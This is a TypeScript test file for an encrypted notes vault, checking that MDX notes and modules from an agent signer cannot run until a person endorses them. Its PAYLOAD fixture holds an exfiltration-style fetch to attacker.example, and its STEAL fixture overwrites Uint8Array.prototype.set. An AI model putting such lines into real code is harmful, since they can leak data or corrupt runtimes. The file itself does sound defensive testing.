import { afterEach, expect, test } from "bun:test";
import Dexie from "dexie";
import { IDBKeyRange, indexedDB } from "fake-indexeddb";
import { noteEntry } from "../../tests/entry-fixture.ts";
import { planPreviewAssets } from "../../tests/preview-planner.ts";
import { createSearchIndex } from "../../tests/search-index.ts";
import { signedVault } from "../../tests/unlock-fixture.ts";
import { localRuntime } from "../app/local-runtime.ts";
import {
  createSeedRecipient,
  passkeyAdmin,
  seedSigningKey,
} from "../crypto/access-v3.ts";
import type { EntrySigner } from "../crypto/authorship.ts";
import { mentionLinkEdit } from "../links/edits.ts";
import { createLinkIndex, noteReferences } from "../links/index.ts";
import { SyncFailure } from "../sync/records.ts";
import { VaultSyncEngine } from "../sync/vault-engine.ts";
import {
  type SnapshotEntry,
  snapshotRemote,
  type VaultSnapshot,
} from "../sync/vault-snapshot.ts";
import {
  type ContentSource,
  createSession,
  type Provenance,
  type VaultSession,
} from "./session.ts";
import { revisionDigest } from "./storage.ts";

Dexie.dependencies.indexedDB = indexedDB;
Dexie.dependencies.IDBKeyRange = IDBKeyRange;
const owner = "did:plc:endorsement";
const key = new Uint8Array(32).fill(6);
const encoder = new TextEncoder();
const PAYLOAD =
  "export const steal = fetch('https://attacker.example/x')\n\nNotes for the Roadmap review.\n";
const opened: VaultSession[] = [];
afterEach(async () => {
  const sessions = opened.splice(0);
  for (const session of sessions) session.lock();
  for (const session of sessions) await session.database.delete();
});

/** A signed vault with a passkey admin and an agent "Bot", synced through the real engine. */
async function world() {
  const vault = crypto.randomUUID();
  const admin = await passkeyAdmin(new Uint8Array(32).fill(1), "admin", owner);
  const agentSeed = new Uint8Array(32).fill(3);
  const agent = await createSeedRecipient(agentSeed, "agent", "Bot");
  const state = await signedVault(
    key,
    { did: owner, vault, epoch: 1 },
    [admin.recipient, agent],
    admin,
  );
  const access = state.access.metadata;
  const agentSigner: EntrySigner = {
    recipientId: agent.id,
    signPublicKey: agent.signPublicKey ?? "",
    privateKey: await seedSigningKey(agentSeed),
  };
  const adminSigner: EntrySigner = {
    recipientId: admin.recipient.id,
    signPublicKey: admin.recipient.signPublicKey ?? "",
    privateKey: admin.privateKey,
  };
  function open(signer: EntrySigner = adminSigner) {
    const session = createSession({
      owner,
      vault,
      key,
      authorship: { signer, access, runners: [adminSigner] },
      planPreviewAssets,
      createSearchIndex,
    });
    opened.push(session);
    return session;
  }
  let snapshot: VaultSnapshot = { cid: "r1", entries: [], access };
  let writes = 1;
  const session = open();
  return {
    vault,
    session,
    open,
    agentSigner,
    adminSigner,
    agent: (id: string, name: string, source: string, revisionCounter = 1) =>
      noteEntry(
        key,
        { did: owner, vault },
        agentSigner,
        { id, name, revisionCounter },
        source,
      ),
    /** Publishes `entries` remotely, replacing any with the same id, and syncs. */
    async push(...entries: SnapshotEntry[]) {
      const ids = new Set(entries.map((entry) => entry.id));
      snapshot = {
        cid: `r${++writes}`,
        entries: [
          ...snapshot.entries.filter((entry) => !ids.has(entry.id)),
          ...entries,
        ],
        access,
      };
      await new VaultSyncEngine(session, {
        version: 2,
        readSnapshot: async () => structuredClone(snapshot),
        async writeSnapshot(written, expectedCid) {
          if (expectedCid !== snapshot.cid)
            throw new SyncFailure("conflict", "CAS");
          snapshot = {
            cid: `r${++writes}`,
            entries: structuredClone(written),
            access,
          };
          return { cid: snapshot.cid };
        },
      }).sync();
    },
  };
}
async function view(session: VaultSession, path: string) {
  const note = (await session.readView()).notes.find((n) => n.path === path);
  if (!note) throw new Error(`Missing ${path}`);
  return note;
}
const runs = async (session: VaultSession, path: string) =>
  (await view(session, path)).origin?.runs;
/** What the shell does for a change it didn't type: ask only when the session names a writer, then save with the answer. */
async function writeIndirect(
  session: VaultSession,
  target: { id: string; path: string },
  source: string,
  answer: boolean,
  sources: readonly ContentSource[] = [],
) {
  const writer = await session.writerToEndorse(target, sources);
  const provenance: Provenance = { sources, endorsed: !!writer && answer };
  await session.saveNote(target.id, target.path, source, provenance);
  return writer;
}

test("linking a mention in an agent's MDX asks, and declining keeps it from running", async () => {
  const w = await world();
  await w.session.saveNote(crypto.randomUUID(), "Roadmap.md", "# Roadmap");
  await w.push(await w.agent("evil", "Weekly.mdx", PAYLOAD));
  expect(await runs(w.session, "Weekly.mdx")).toBe(false);
  const notes = (await w.session.readView()).notes.map((note) => ({
    id: note.id,
    path: note.path,
    source: note.source,
    kind: note.format,
  }));
  const index = createLinkIndex(notes);
  const roadmap = notes.find((note) => note.path === "Roadmap.md");
  const mention = noteReferences(index, roadmap?.id ?? "").unlinked.find(
    (row) => row.noteId === "evil",
  );
  const edit = mention && mentionLinkEdit(index, roadmap?.id ?? "", mention);
  if (!edit) throw new Error("No link edit");
  const linked =
    PAYLOAD.slice(0, edit.from) + edit.insert + PAYLOAD.slice(edit.to);
  const target = { id: "evil", path: "Weekly.mdx" };

  expect(await writeIndirect(w.session, target, linked, false)).toBe(
    "agent “Bot”",
  );
  const declined = await view(w.session, "Weekly.mdx");
  expect(declined.source).toContain("[[Roadmap]]");
  expect(declined.origin).toEqual({ runs: false, author: "Not signed" });

  const again = `${linked}\nSee [[Roadmap]] again.`;
  expect(await writeIndirect(w.session, target, again, true)).toBe(
    "an unknown writer",
  );
  expect((await view(w.session, "Weekly.mdx")).origin).toEqual({
    runs: true,
    author: "Signed by a passkey",
  });
});

/** What the shell does for Restore version: ask about that exact history row, then have the session restore it. */
async function restore(
  session: VaultSession,
  id: string,
  historyId: string,
  answer: boolean,
) {
  const writer = await session.writerToEndorse({ path: "Plan.mdx" }, [
    { id, historyId },
  ]);
  await session.restoreVersion(id, historyId, !!writer && answer);
  return writer;
}
async function versionOf(session: VaultSession, id: string, source: string) {
  const found = (await session.history(id)).find(
    (value) => value.source === source,
  );
  if (!found) throw new Error(`Missing version ${source}`);
  return found;
}

test("restoring a version vouches by that version alone: the person's own runs, an agent's asks", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Plan.mdx", "# My plan");
  await w.session.saveNote(id, "Plan.mdx", "# My plan, revised");
  await w.push(await w.agent(id, "Plan.mdx", PAYLOAD, 5));
  expect(await runs(w.session, "Plan.mdx")).toBe(false);

  const mine = await versionOf(w.session, id, "# My plan");
  expect(await restore(w.session, id, mine.historyId, false)).toBeNull();
  expect(await view(w.session, "Plan.mdx")).toMatchObject({
    source: "# My plan",
    origin: { runs: true },
  });

  const agent = await versionOf(w.session, id, PAYLOAD);
  expect(await restore(w.session, id, agent.historyId, false)).toBe(
    "agent “Bot”",
  );
  expect(await runs(w.session, "Plan.mdx")).toBe(false);

  await restore(w.session, id, agent.historyId, true);
  expect((await view(w.session, "Plan.mdx")).origin).toEqual({
    runs: true,
    author: "Signed by a passkey",
  });
});

test("an agent entry reusing a signed revision id never restores as the person's version", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Plan.mdx", "# My plan");
  await w.session.saveNote(id, "Plan.mdx", "# My plan, revised");
  const mine = await versionOf(w.session, id, "# My plan");
  const reused = await noteEntry(
    key,
    { did: owner, vault: w.vault },
    w.agentSigner,
    { id, name: "Plan.mdx", revisionCounter: 5 },
    PAYLOAD,
    mine.revision,
  );
  // Sync now refuses this reuse (see RN1 below); a database that took it before that check still restores safely.
  const { remote, blobs } = snapshotRemote(reused);
  await w.session.applyRemote(remote, blobs);
  expect(await runs(w.session, "Plan.mdx")).toBe(false);
  await w.session.saveNote(id, "Plan.mdx", `${PAYLOAD}typo`);
  const agent = await versionOf(w.session, id, PAYLOAD);
  expect(agent.revision).toBe(mine.revision);
  expect(agent.historyId).not.toBe(mine.historyId);

  expect(await restore(w.session, id, agent.historyId, false)).toBe(
    "agent “Bot”",
  );
  expect(await view(w.session, "Plan.mdx")).toMatchObject({
    source: PAYLOAD,
    origin: { runs: false },
  });
  expect(await restore(w.session, id, mine.historyId, false)).toBeNull();
  expect(await view(w.session, "Plan.mdx")).toMatchObject({
    source: "# My plan",
    origin: { runs: true },
  });
  await expect(
    w.session.restoreVersion("other", mine.historyId),
  ).rejects.toThrow("This version is no longer available.");
});

test("a replacing write with no source to vouch for it stays unsigned", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Plan.mdx", "# My plan");
  await w.session.saveNote(id, "Plan.mdx", "# Replaced", { replaces: true });
  expect(await runs(w.session, "Plan.mdx")).toBe(false);
  await w.session.saveNote(id, "Plan.mdx", "# Replaced again", {
    replaces: true,
    sources: [{ id, historyId: `${id}:999` }],
  });
  expect(await runs(w.session, "Plan.mdx")).toBe(false);
});

test("a template someone else wrote keeps the note it fills unsigned unless endorsed", async () => {
  const w = await world();
  await w.push(await w.agent("template", "Daily template.md", PAYLOAD));
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Daily.mdx", "# Today\n");
  const target = { id, path: "Daily.mdx" };
  const sources = [{ id: "template" }];
  expect(
    await writeIndirect(
      w.session,
      target,
      `# Today\n${PAYLOAD}`,
      false,
      sources,
    ),
  ).toBe("agent “Bot”");
  expect(await runs(w.session, "Daily.mdx")).toBe(false);

  const plain = crypto.randomUUID();
  await w.session.saveNote(plain, "Daily note.md", "", {
    sources,
  });
  expect(
    await w.session.writerToEndorse({ id: plain, path: "Daily note.md" }),
  ).toBeNull();
  expect((await w.session.database.items.get(plain))?.author).toBeUndefined();
  await w.session.saveNote(plain, "Daily note.mdx", "");
  expect(await runs(w.session, "Daily note.mdx")).toBe(false);
});

test("a change made outside the editor never signs an agent's note it didn't ask about", async () => {
  const w = await world();
  await w.push(
    await w.agent("props", "Props.mdx", `---\nstatus: draft\n---\n${PAYLOAD}`),
    await w.agent("plain", "Plain.md", PAYLOAD),
  );
  await w.session.saveNote(
    "props",
    "Props.mdx",
    `---\nstatus: done\n---\n${PAYLOAD}`,
    {},
  );
  expect(await runs(w.session, "Props.mdx")).toBe(false);
  await w.session.saveNote("plain", "Plain.md", `${PAYLOAD}\n- [x] Done`, {});
  expect((await w.session.database.items.get("plain"))?.author).toBeUndefined();
  await w.session.rename("plain", "Plain.mdx");
  expect(await runs(w.session, "Plain.mdx")).toBe(false);

  const mine = crypto.randomUUID();
  await w.session.saveNote(mine, "Mine.mdx", "# Mine");
  await w.session.saveNote(mine, "Mine.mdx", "# Mine\n\n## Moved", {});
  expect(await runs(w.session, "Mine.mdx")).toBe(true);
});

test("typing in an agent's note keeps it unsigned until the person trusts it", async () => {
  const w = await world();
  await w.push(await w.agent("typed", "Typed.mdx", PAYLOAD));
  await w.session.saveNote("typed", "Typed.mdx", `${PAYLOAD}\nReviewed.`);
  expect((await view(w.session, "Typed.mdx")).origin).toEqual({
    runs: false,
    author: "Not signed",
  });
  const typed = await view(w.session, "Typed.mdx");
  await w.session.trust([{ id: "typed", digest: typed.digest ?? "" }]);
  await w.session.saveNote("typed", "Typed.mdx", `${typed.source}\nMore.`);
  expect((await view(w.session, "Typed.mdx")).origin).toEqual({
    runs: true,
    author: "Signed by a passkey",
  });
});

test("declining a prompt holds through later typing", async () => {
  const w = await world();
  await w.push(await w.agent("held", "Held.mdx", PAYLOAD));
  const target = { id: "held", path: "Held.mdx" };
  await writeIndirect(w.session, target, `${PAYLOAD}\n[[Roadmap]]`, false);
  await w.session.saveNote("held", "Held.mdx", `${PAYLOAD}\n[[Roadmap]] typo`);
  expect(await runs(w.session, "Held.mdx")).toBe(false);
});

test("composing from an agent's MDX asks, and declining leaves the result unable to run", async () => {
  const w = await world();
  await w.push(await w.agent("origin", "Origin.mdx", PAYLOAD));
  expect(
    await w.session.writerToEndorse({ path: "Extracted.mdx" }, [
      { id: "origin" },
    ]),
  ).toBe("agent “Bot”");
  const extract = (path: string, source: string) => ({
    kind: "extract" as const,
    originId: "origin",
    expectedSource: source,
    from: 0,
    to: source.indexOf("\n"),
    path,
  });
  await w.session.compose(extract("Extracted.mdx", PAYLOAD));
  expect(await runs(w.session, "Extracted.mdx")).toBe(false);
  expect(await runs(w.session, "Origin.mdx")).toBe(false);

  const remaining = (await view(w.session, "Origin.mdx")).source;
  await w.session.compose(extract("Endorsed.mdx", remaining), true);
  expect(await runs(w.session, "Endorsed.mdx")).toBe(true);
  // An extract rewrites its origin too; the prompt lists both, so the endorsement covers both.
  expect(await runs(w.session, "Origin.mdx")).toBe(true);
  await w.push(await w.agent("origin", "Origin.mdx", PAYLOAD, 9));

  const target = crypto.randomUUID();
  await w.session.saveNote(target, "Target.mdx", "# Mine");
  const origin = (await view(w.session, "Origin.mdx")).source;
  await w.session.compose({
    kind: "merge",
    originId: "origin",
    targetId: target,
    expectedSource: origin,
    expectedTargetSource: "# Mine",
  });
  expect(await runs(w.session, "Target.mdx")).toBe(false);
});

test("importing code signs it only when the person endorses it", async () => {
  const w = await world();
  const files = (prefix: string) => [
    { path: `${prefix}/Note.mdx`, bytes: encoder.encode(PAYLOAD) },
    { path: `${prefix}/view.ts`, bytes: encoder.encode("export default 1") },
    { path: `${prefix}/Plain.md`, bytes: encoder.encode("# Plain") },
  ];
  const asked: (readonly string[])[] = [];
  await w.session.import(files("Declined"), async (code) => {
    asked.push(code);
    return false;
  });
  expect(asked).toEqual([["Declined/Note.mdx", "Declined/view.ts"]]);
  expect(await runs(w.session, "Declined/Note.mdx")).toBe(false);
  const plain = await view(w.session, "Declined/Plain.md");
  expect(
    (await w.session.database.items.get(plain.id))?.author,
  ).toBeUndefined();

  await w.session.import(files("Accepted"), async () => true);
  expect(await runs(w.session, "Accepted/Note.mdx")).toBe(true);
  const id = crypto.randomUUID();
  await w.session.saveNote(
    id,
    "Uses.mdx",
    "import V from './Accepted/view.ts'",
  );
  expect((await w.session.assetsForNote(id)).map((a) => a.runs)).toEqual([
    true,
  ]);

  await w.session.import(
    [{ path: "Only.md", bytes: encoder.encode("# Only") }],
    async () => {
      throw new Error("No code to ask about");
    },
  );
  expect(await runs(w.session, "Accepted/Note.mdx")).toBe(true);
});

test("nothing asks when the write would promote nothing", async () => {
  const w = await world();
  await w.push(await w.agent("agent", "Agent.mdx", PAYLOAD));
  expect(
    await w.session.writerToEndorse({ id: "agent", path: "Agent.md" }),
  ).toBeNull();
  expect(
    await w.session.writerToEndorse({ id: "agent", path: "Agent.mdx" }, [
      { id: "missing" },
    ]),
  ).toBe("agent “Bot”");
  expect(
    await w.session.writerToEndorse({ path: "New.mdx" }, [{ id: "missing" }]),
  ).toBe("an unknown writer");

  const agentSession = w.open(w.agentSigner);
  expect(
    await agentSession.writerToEndorse({ id: "agent", path: "Agent.mdx" }),
  ).toBeNull();
  const unsigned = createSession({ owner, vault: "unsigned", key });
  opened.push(unsigned);
  await unsigned.import(
    [{ path: "Old.mdx", bytes: encoder.encode(PAYLOAD) }],
    async () => {
      throw new Error("An unsigned vault has nothing to endorse");
    },
  );
  expect(
    await unsigned.writerToEndorse({
      id: (await unsigned.listNotes())[0]?.id,
      path: "Old.mdx",
    }),
  ).toBeNull();
  expect(await runs(unsigned, "Old.mdx")).toBe(true);
});

test("a verdict computed while new access arrives is never the stale one, and listeners hear of it", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Mine.mdx", "# Mine");
  const stored = await w.session.database.items.get(id);
  if (!stored) throw new Error("Missing stored note");
  let heard = 0;
  let refreshed = 0;
  w.session.subscribeAuthority(() => {
    heard++;
  });
  localRuntime(w.session).subscribeChanges(() => {
    refreshed++;
  });
  const successor = await passkeyAdmin(
    new Uint8Array(32).fill(9),
    "successor",
    owner,
  );
  const changed = await signedVault(
    key,
    { did: owner, vault: w.vault, epoch: 1 },
    [successor.recipient],
    successor,
  );
  const verdict = w.session.origin(stored);
  w.session.authorize(changed.access.metadata);
  expect((await verdict).runs).toBe(false);
  expect(heard).toBe(1);
  expect(refreshed).toBeGreaterThanOrEqual(1);
  expect((await w.session.origin(stored)).runs).toBe(false);
});

const STEAL = `export const stolen = (globalThis.__x2Ran = true)\n\nexport const hook = (Uint8Array.prototype.set = function () {})\n\n# Weekly review`;
test("fails closed: an agent's code is never cleared to run until the person trusts it, and nothing the session does executes it", async () => {
  const w = await world();
  const original = Uint8Array.prototype.set;
  await w.push(
    await w.agent("evil", "Evil.mdx", STEAL),
    await noteEntry(
      key,
      { did: owner, vault: w.vault },
      w.agentSigner,
      { id: "steal", name: "steal.ts", kind: "asset", mime: "text/javascript" },
      "export default (globalThis.__x2Ran = true)",
    ),
  );
  const dash = crypto.randomUUID();
  await w.session.saveNote(
    dash,
    "Dash.mdx",
    "import S from './steal.ts'\n\n{S}",
  );
  const runtime = localRuntime(w.session);
  const notes = await runtime.list();
  const dashNote = notes.find((note) => note.path === "Dash.mdx");
  if (!dashNote) throw new Error("Missing Dash.mdx");
  // A preview runs a note only on these verdicts: the note's own and each module's.
  expect(notes.find((note) => note.path === "Evil.mdx")?.origin?.runs).toBe(
    false,
  );
  expect(dashNote.origin?.runs).toBe(true);
  expect((await runtime.assets(dashNote)).map((asset) => asset.runs)).toEqual([
    false,
  ]);
  await runtime.save({
    id: crypto.randomUUID(),
    path: "Groceries.md",
    kind: "md",
    source: "- milk",
  });
  expect(Reflect.has(globalThis, "__x2Ran")).toBe(false);
  expect(Uint8Array.prototype.set).toBe(original);

  const evil = notes.find((note) => note.path === "Evil.mdx");
  await runtime.trust([{ id: "evil", digest: evil?.digest ?? "" }]);
  const [module] = await runtime.assets(dashNote);
  await runtime.trust([{ id: "steal", digest: module?.digest ?? "" }]);
  const trusted = (await runtime.list()).find(
    (note) => note.path === "Evil.mdx",
  );
  expect(trusted?.origin).toEqual({
    runs: true,
    author: "Signed by a passkey",
  });
  await expect(
    runtime.trust([{ id: "evil", digest: evil?.digest ?? "" }]),
  ).rejects.toThrow("This note changed");
  expect((await runtime.assets(dashNote)).map((asset) => asset.runs)).toEqual([
    true,
  ]);
  expect(Reflect.has(globalThis, "__x2Ran")).toBe(false);
});

/** What a key holder can leave behind locally: other content stored under the same revision id. */
async function swapUnderSameRevision(
  w: Awaited<ReturnType<typeof world>>,
  id: string,
  name: string,
  source: string,
) {
  const stored = await w.session.database.items.get(id);
  if (!stored) throw new Error(`Missing ${name}`);
  const swapped = await noteEntry(
    key,
    { did: owner, vault: w.vault },
    w.agentSigner,
    { id, name, revisionCounter: 9 },
    source,
    stored.revision,
  );
  await w.session.database.items.update(id, {
    envelope: swapped.envelope,
    author: swapped.author,
  });
}

test("trust binds to the exact content shown: other content under the same revision id is refused", async () => {
  const w = await world();
  await w.push(await w.agent("swap", "Swap.mdx", "# Harmless"));
  const shown = await view(w.session, "Swap.mdx");
  expect(shown.origin?.runs).toBe(false);
  await swapUnderSameRevision(w, "swap", "Swap.mdx", PAYLOAD);
  expect((await view(w.session, "Swap.mdx")).source).toBe(PAYLOAD);
  await expect(
    w.session.trust([{ id: "swap", digest: shown.digest ?? "" }]),
  ).rejects.toThrow("This note changed");
  expect(await runs(w.session, "Swap.mdx")).toBe(false);
});

test("module trust binds to the exact module bytes the preview loaded", async () => {
  const w = await world();
  await w.push(
    await noteEntry(
      key,
      { did: owner, vault: w.vault },
      w.agentSigner,
      { id: "mod", name: "mod.ts", kind: "asset", mime: "text/javascript" },
      "export default 'harmless'",
    ),
  );
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Uses.mdx", "import M from './mod.ts'\n\n{M}");
  const [loaded] = await w.session.assetsForNote(id);
  expect(loaded?.runs).toBe(false);
  const stored = await w.session.database.items.get("mod");
  if (!stored) throw new Error("Missing module");
  const swapped = await noteEntry(
    key,
    { did: owner, vault: w.vault },
    w.agentSigner,
    { id: "mod", name: "mod.ts", kind: "asset", mime: "text/javascript" },
    "export default (globalThis.__swapped = true)",
    stored.revision,
  );
  await w.session.database.items.update("mod", { envelope: swapped.envelope });
  await expect(
    w.session.trust([{ id: "mod", digest: loaded?.digest ?? "" }]),
  ).rejects.toThrow("This note changed");
  const [reloaded] = await w.session.assetsForNote(id);
  expect(new TextDecoder().decode(reloaded?.bytes)).toContain("__swapped");
  expect(reloaded?.digest).not.toBe(loaded?.digest);
});

test("signing held code on trash or restore binds to the row the person was asked about", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Mine.mdx", "# Mine");
  const asked = await w.session.database.items.get(id);
  if (!asked) throw new Error("Missing Mine.mdx");
  const digest = await revisionDigest(asked);
  await swapUnderSameRevision(w, id, "Mine.mdx", PAYLOAD);
  await expect(w.session.remove(id, digest)).rejects.toThrow(
    "This note changed",
  );
  await w.session.remove(id);
  const trashed = await w.session.database.items.get(id);
  await expect(w.session.restore(id, digest)).rejects.toThrow(
    "This note changed",
  );
  expect(trashed?.author).toBeUndefined();
});

test("a prompt or compose judges the row as it is now, not a revision id seen earlier", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Mine.mdx", "# Mine\n\nKeep this.");
  const shown = await view(w.session, "Mine.mdx");
  expect(await w.session.writerToEndorse({ id, path: "Mine.mdx" })).toBeNull();
  await swapUnderSameRevision(w, id, "Mine.mdx", PAYLOAD);
  expect(await w.session.writerToEndorse({ id, path: "Mine.mdx" })).toBe(
    "agent “Bot”",
  );
  await expect(
    w.session.compose({
      kind: "extract",
      originId: id,
      expectedSource: shown.source,
      from: 0,
      to: 6,
      path: "Extracted.mdx",
    }),
  ).rejects.toThrow();
  expect((await w.session.readView()).notes.map((note) => note.path)).toEqual([
    "Mine.mdx",
  ]);
});

test("sync never applies other content under a revision id this database already holds", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Plan.mdx", "# My plan");
  await w.session.saveNote(id, "Plan.mdx", "# My plan, revised");
  const mine = await versionOf(w.session, id, "# My plan");
  await w.push(
    await noteEntry(
      key,
      { did: owner, vault: w.vault },
      w.agentSigner,
      { id, name: "Plan.mdx", revisionCounter: 5 },
      PAYLOAD,
      mine.revision,
    ),
  );
  expect(await view(w.session, "Plan.mdx")).toMatchObject({
    source: "# My plan, revised",
    origin: { runs: true },
  });
  expect(
    (await w.session.history(id)).filter(
      (version) => version.revision === mine.revision,
    ),
  ).toHaveLength(1);
});

test("Trust refuses content swapped back under the shown revision id between show and sign", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  const context = { did: owner, vault: w.vault };
  const shown = await noteEntry(
    key,
    context,
    w.agentSigner,
    { id, name: "Weekly.mdx", revisionCounter: 1 },
    "Weekly notes, reviewed by the person.\n",
  );
  await w.push(shown);
  const displayed = await view(w.session, "Weekly.mdx");
  expect(displayed.origin?.runs).toBe(false);
  await w.push(
    await noteEntry(
      key,
      context,
      w.agentSigner,
      { id, name: "Weekly.mdx", revisionCounter: 2 },
      "interim",
    ),
  );
  await w.push(
    await noteEntry(
      key,
      context,
      w.agentSigner,
      { id, name: "Weekly.mdx", revisionCounter: 3 },
      PAYLOAD,
      shown.revision,
    ),
  );
  await expect(
    w.session.trust([{ id, digest: displayed.digest ?? "" }]),
  ).rejects.toThrow("This note changed");
  expect(await runs(w.session, "Weekly.mdx")).toBe(false);
});

test("a keystroke typed on the replaced document after a restore doesn't take the restored signature", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Plan.mdx", "# My plan");
  await w.session.saveNote(id, "Plan.mdx", "# My plan, revised");
  await w.push(await w.agent(id, "Plan.mdx", PAYLOAD, 5));
  const agentView = await view(w.session, "Plan.mdx");
  expect(agentView.origin?.runs).toBe(false);
  const mine = await versionOf(w.session, id, "# My plan");
  expect(await restore(w.session, id, mine.historyId, false)).toBeNull();
  expect(await runs(w.session, "Plan.mdx")).toBe(true);
  // The editor still held the agent's document, so this save is based on its revision.
  await w.session.saveNote(id, "Plan.mdx", `${PAYLOAD}x`, undefined, {
    revision: agentView.revision,
    digest: agentView.digest,
  });
  expect(await view(w.session, "Plan.mdx")).toMatchObject({
    source: `${PAYLOAD}x`,
    origin: { runs: false },
  });
});

test("typing ahead of a refresh on the person's own note keeps it signed", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Mine.mdx", "# Mine");
  const shown = await view(w.session, "Mine.mdx");
  for (const source of ["# Mine a", "# Mine ab", "# Mine abc"])
    await w.session.saveNote(id, "Mine.mdx", source, undefined, {
      revision: shown.revision,
      digest: shown.digest,
    });
  expect(await view(w.session, "Mine.mdx")).toMatchObject({
    source: "# Mine abc",
    origin: { runs: true },
  });
});

test("an endorsement means nothing in a session that can't sign as an admin", async () => {
  const w = await world();
  await w.push(await w.agent("bare", "Bare.mdx", PAYLOAD));
  const seed = w.open(w.agentSigner);
  await w.push();
  const stored = await w.session.database.items.get("bare");
  if (!stored) throw new Error("Missing Bare.mdx");
  await seed.database.items.put(stored);
  await seed.saveNote("bare", "Moved.mdx", PAYLOAD, { endorsed: true });
  const moved = await seed.database.items.get("bare");
  expect(moved?.author).toBeUndefined();
  const trashed = await seed.database.items.get("bare");
  if (!trashed) throw new Error("Missing moved note");
  await seed.remove("bare", await revisionDigest(trashed));
  expect((await seed.database.items.get("bare"))?.author).toBeUndefined();
});

test("a change typed on the person's own view vouches by that view, never by a newer row it replaces", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Plan.mdx", "# My plan");
  await w.session.saveNote(id, "Plan.mdx", "# My plan, revised");
  const typedOn = await view(w.session, "Plan.mdx");
  const older = await versionOf(w.session, id, "# My plan");
  // A restore replaces the row under the editor; the newer row is the person's own too, but it isn't what they typed on.
  await restore(w.session, id, older.historyId, false);
  await w.session.saveNote(
    id,
    "Plan.mdx",
    "# My plan, revised and typed on",
    undefined,
    { revision: typedOn.revision, digest: typedOn.digest },
  );
  expect(await view(w.session, "Plan.mdx")).toMatchObject({
    source: "# My plan, revised and typed on",
    origin: { runs: true },
  });
  // A base that is gone from this device vouches for nothing.
  await w.session.saveNote(id, "Plan.mdx", "# Unknown base", undefined, {
    revision: "gone",
    digest: "gone",
  });
  expect(await runs(w.session, "Plan.mdx")).toBe(false);
});

test("typing on the agent's note before a restore never lets a later stale save take the restored signature", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Plan.mdx", "# My plan");
  await w.session.saveNote(id, "Plan.mdx", "# My plan, revised");
  await w.push(await w.agent(id, "Plan.mdx", PAYLOAD, 5));
  const agentView = await view(w.session, "Plan.mdx");
  const base = { revision: agentView.revision, digest: agentView.digest };
  await w.session.saveNote(id, "Plan.mdx", `${PAYLOAD}typo`, undefined, base);
  expect(await runs(w.session, "Plan.mdx")).toBe(false);
  const mine = await versionOf(w.session, id, "# My plan");
  expect(await restore(w.session, id, mine.historyId, false)).toBeNull();
  expect(await runs(w.session, "Plan.mdx")).toBe(true);
  await w.session.saveNote(id, "Plan.mdx", `${PAYLOAD}x`, undefined, base);
  expect(await view(w.session, "Plan.mdx")).toMatchObject({
    source: `${PAYLOAD}x`,
    origin: { runs: false },
  });
});

test("typing right after Trust, before the view refreshes, keeps the trust", async () => {
  const w = await world();
  await w.push(await w.agent("weekly", "Weekly.mdx", "Weekly\n"));
  const shown = await view(w.session, "Weekly.mdx");
  await w.session.trust([{ id: "weekly", digest: shown.digest ?? "" }]);
  await w.session.saveNote("weekly", "Weekly.mdx", "Weekly\nmore", undefined, {
    revision: shown.revision,
    digest: shown.digest,
  });
  expect(await view(w.session, "Weekly.mdx")).toMatchObject({
    source: "Weekly\nmore",
    origin: { runs: true },
  });
});

test("a keystroke on a view my other device replaced builds on my own archived row", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Mine.mdx", "# Mine");
  await w.push();
  const before = await view(w.session, "Mine.mdx");
  await w.push(
    await noteEntry(
      key,
      { did: owner, vault: w.vault },
      w.adminSigner,
      { id, name: "Mine.mdx", revisionCounter: 2 },
      "# Mine, from my laptop",
    ),
  );
  expect(await runs(w.session, "Mine.mdx")).toBe(true);
  expect(
    (await w.session.history(id)).some(
      (version) => version.source === "# Mine",
    ),
  ).toBe(true);
  await w.session.saveNote(id, "Mine.mdx", "# Mine typed", undefined, {
    revision: before.revision,
    digest: before.digest,
  });
  expect(await view(w.session, "Mine.mdx")).toMatchObject({
    source: "# Mine typed",
    origin: { runs: true },
  });
});

test("search re-reads a note whose ciphertext changed under the same revision id", async () => {
  const w = await world();
  const id = crypto.randomUUID();
  await w.session.saveNote(id, "Mine.md", "alpha");
  expect((await w.session.search("alpha")).map((hit) => hit.id)).toEqual([id]);
  await swapUnderSameRevision(w, id, "Mine.md", "omega");
  expect(await w.session.search("alpha")).toEqual([]);
  expect((await w.session.search("omega")).map((hit) => hit.id)).toEqual([id]);
});
